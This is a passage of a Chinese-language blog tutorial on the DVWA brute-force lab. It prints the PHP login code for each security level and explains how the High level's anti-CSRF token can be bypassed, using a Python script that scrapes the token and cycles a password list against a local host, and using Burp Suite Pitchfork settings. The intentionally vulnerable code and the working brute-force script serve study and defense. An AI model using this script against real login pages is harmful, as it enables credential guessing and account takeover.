class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一关对获取到的username和password没有做任何处理，可以直接使用Burpsuite进行爆破即可。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223105115625.png" alt="image-20210223105115625"></p>
<h3 id="Meium"><a href="#Meium" class="headerlink" title="Meium"></a>Meium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>mysqli_real_escape_string(connection,escapestring);</strong></p>
<p><em>connection</em>：必需。规定要使用的 MySQL 连接。</p>
<p><em>escapestring</em>：必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</p>
<p>本关的username和password使用了mysqli_real_escape_string函数进行过滤，目的是过滤转义字符，防止sql注入；同时最后对登陆失败时候休眠2秒，使得暴力破解的速度变慢。</p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一关在前一关的基础上加上了对username和password两个变量使用了stripslashes这个函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stripslashes(<span class="keyword">string</span> <span class="variable">$str</span> ):<span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>这个函数的作用是返回一个去除转义反斜线后的字符串（<code>\&#39;</code> 转换为 <code>&#39;</code> 等等）。双反斜线（<code>\\</code>）被转换为单个反斜线（<code>\</code>）。</p>
<p>High级别的代码加入了Token，可以抵御CSRF攻击。每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p>
<p>方法一：使用python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>(<span class="params">headers</span>):</span></span><br><span class="line">    index_url = <span class="string">&#x27;http://127.0.0.1/vulnerabilities/brute/index.php&#x27;</span></span><br><span class="line">    index_html = requests.get(url=index_url, headers=headers, timeout=<span class="number">3</span>).text</span><br><span class="line">    token_pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;name=&#x27;user_token&#x27; value=&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">    token = token_pattern.findall(index_html)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_with_token</span>(<span class="params">uname, passwd, headers</span>):</span></span><br><span class="line">    token = get_token(headers)</span><br><span class="line">    brute_url = <span class="string">f&#x27;http://127.0.0.1/vulnerabilities/brute/index.php?username=<span class="subst">&#123;uname&#125;</span>&amp;password=<span class="subst">&#123;passwd&#125;</span>&amp;Login=Login&amp;user_token=<span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">    r = requests.get(url=brute_url, headers=headers)</span><br><span class="line">    print(<span class="string">f&#x27;<span class="subst">&#123;token&#125;</span>:<span class="subst">&#123;uname&#125;</span>:<span class="subst">&#123;passwd&#125;</span>&#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Welcome&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">&#x27;\nBingo 爆破成功&#x27;</span>)</span><br><span class="line">        print(<span class="string">f&#x27;username:<span class="subst">&#123;uname&#125;</span> \npassword:<span class="subst">&#123;passwd&#125;</span>\n&#x27;</span>)</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 86.0.4240.183Safari / 537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh - CN, zh;q = 0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=gupr1d2l31e01pcbbdisn8jqu6; security=high&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = sys.argv[<span class="number">1</span>]</span><br><span class="line">    password_path = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(password_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = <span class="string">&#x27;&#x27;</span>.join(f.readlines()).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> lines:</span><br><span class="line">            brute_with_token(username, password, headers)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;文件读取异常&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223170718584.png" alt="image-20210223170718584"></p>
<p>方法二：使用Brup Suite</p>
<p>选择Pitchfork爆破模式</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223173723966.png" alt="image-20210223173723966"></p>
<p>再第二个payload使用递归搜索</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223173820719.png" alt="image-20210223173820719"></p>
<p>在选项中选择单线程，并且在选项的最下面设置总是重定向</p>
<p>找到 「Grep - Extract」添加一个 Grep 查询筛选， 接着点击获取返回包值，然后鼠标选择要提取的 token，此时 Burpsuite 会自动生成对应的匹配规则：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223174021234.png" alt="image-20210223174021234"></p>
<p>点击确定，开始爆破，运行结果</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223173708141.png" alt="image-20210223173708141"></p>
<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="variable">$timenow</span>    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>impossible难度下，又加入了失败次数的验证，当失败3次的时候要等待15分钟才能进行下一次尝试，这样就直接防止了爆破攻击</p>
